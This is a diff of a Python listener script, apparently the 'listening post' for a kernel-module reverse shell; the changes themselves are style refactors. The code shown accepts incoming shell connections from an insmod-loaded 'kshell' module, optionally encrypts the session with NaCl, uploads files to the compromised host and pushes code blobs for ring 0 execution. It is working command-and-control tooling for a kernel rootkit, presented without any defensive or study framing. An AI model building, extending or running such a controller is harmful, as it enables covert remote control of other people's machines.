@@ -20,6 +20,8 @@ Usage:
 from __future__ import annotations
 
 import argparse
+import contextlib
+import importlib.util
 import os
 import socket
 import struct
@@ -30,19 +32,15 @@ import threading
 try:
     import nacl.secret
     import nacl.utils
+
     HAS_NACL = True
 except ImportError:
     HAS_NACL = False
 
-# Fallback: try cryptography library with XSalsa20 if available
-if not HAS_NACL:
-    try:
-        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
-        HAS_CRYPTO_FALLBACK = True
-    except ImportError:
-        HAS_CRYPTO_FALLBACK = False
-else:
-    HAS_CRYPTO_FALLBACK = False
+# Fallback: detect the cryptography library (XSalsa20) if PyNaCl is absent
+HAS_CRYPTO_FALLBACK = (
+    not HAS_NACL and importlib.util.find_spec("cryptography") is not None
+)
 
 
 class PlaintextSession:
@@ -105,8 +103,7 @@ class NaClSession:
         if self.box:
             # PyNaCl expects nonce + ciphertext (tag is inside ciphertext)
             try:
-                plaintext = self.box.decrypt(auth_and_ct, nonce)
-                return plaintext
+                return self.box.decrypt(auth_and_ct, nonce)
             except Exception as e:
                 print(f"\n[!] Decryption failed: {e}")
                 return b""
@@ -158,13 +155,13 @@ def run_listener(port: int, key: str | None):
 
     mode = "NaCl secretbox (XSalsa20 + Poly1305)" if encrypted else "plaintext"
     print(f"\n{'=' * 60}")
-    print(f"  LISTENING POST")
+    print("  LISTENING POST")
     print(f"  Port: {port}")
     print(f"  Mode: {mode}")
     if encrypted:
         print(f"  Key:  {key[:16]}...{key[-8:]}")
     print(f"{'=' * 60}")
-    print(f"\n[*] Waiting for kernel shell connection...\n")
+    print("\n[*] Waiting for kernel shell connection...\n")
 
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -178,14 +175,14 @@ def run_listener(port: int, key: str | None):
 
             if encrypted:
                 session = NaClSession(conn, key)
-                print(f"[*] NaCl encrypted session")
+                print("[*] NaCl encrypted session")
             else:
                 session = PlaintextSession(conn)
 
             handle_session(session)
-            print(f"\n[*] Session closed, waiting for next connection...\n")
+            print("\n[*] Session closed, waiting for next connection...\n")
     except KeyboardInterrupt:
-        print(f"\n[*] Listener stopped")
+        print("\n[*] Listener stopped")
     finally:
         srv.close()
 
@@ -232,9 +229,12 @@ def handle_session(session):
                 local_file, remote_path = parts
                 try:
                     import base64
+
                     data = open(local_file, "rb").read()
                     b64 = base64.b64encode(data).decode()
-                    print(f"[lp] uploading {local_file} ({len(data)} bytes) → {remote_path}")
+                    print(
+                        f"[lp] uploading {local_file} ({len(data)} bytes) → {remote_path}"
+                    )
                     session.send(f"!upload {remote_path} {b64}\n".encode())
                 except FileNotFoundError:
                     print(f"[lp] file not found: {local_file}")
@@ -248,9 +248,12 @@ def handle_session(session):
                 local_file = stripped[7:].strip()
                 try:
                     import base64
+
                     data = open(local_file, "rb").read()
                     b64 = base64.b64encode(data).decode()
-                    print(f"[lp] sending PIC blob {local_file} ({len(data)} bytes) for ring 0 exec")
+                    print(
+                        f"[lp] sending PIC blob {local_file} ({len(data)} bytes) for ring 0 exec"
+                    )
                     session.send(f"!kload {b64}\n".encode())
                 except FileNotFoundError:
                     print(f"[lp] file not found: {local_file}")
@@ -277,10 +280,8 @@ def handle_session(session):
         pass
 
     running[0] = False
-    try:
+    with contextlib.suppress(OSError):
         session.close()
-    except OSError:
-        pass
 
 
 def main():
@@ -298,19 +299,22 @@ Examples:
 
   # Generate a key
   python3 kernel/lp/listener.py --genkey
-        """)
+        """,
+    )
 
     parser.add_argument("--port", type=int, default=4444)
-    parser.add_argument("--key", default=None,
-                        help="256-bit hex key for NaCl encrypted mode")
-    parser.add_argument("--genkey", action="store_true",
-                        help="Generate and print a random key")
+    parser.add_argument(
+        "--key", default=None, help="256-bit hex key for NaCl encrypted mode"
+    )
+    parser.add_argument(
+        "--genkey", action="store_true", help="Generate and print a random key"
+    )
     args = parser.parse_args()
 
     if args.genkey:
         k = os.urandom(32).hex()
         print(f"Key: {k}")
-        print(f"\nUsage:")
+        print("\nUsage:")
         print(f"  python3 kernel/lp/listener.py --port {args.port} --key {k}")
         print(f"  insmod kshell_nacl.ko host=<IP> port={args.port} key={k}")
         return 0
